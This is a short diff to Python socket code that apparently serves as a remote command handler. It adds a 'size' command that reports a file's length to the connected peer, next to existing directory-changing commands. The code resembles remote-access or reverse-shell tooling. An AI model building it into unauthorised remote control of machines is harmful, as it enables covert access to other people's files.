@@ -44,3 +44,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 					break
 				elif(("cd" in cmd.lower()) or ("chdir" in cmd.lower())):
 					os.chdir(conn.recv(1024).decode('utf-8'))
+				elif("size" in cmd.lower()):
+					data = conn.recv(1024).decode(encoding="utf-8")
+					try:
+						with open(data, 'rb') as f:
+							conn.sendall(bytes(str(len(f.read())), 'utf-8'))
+					except:
+						conn.sendall("Resource Not Found!".encode("utf-8"))
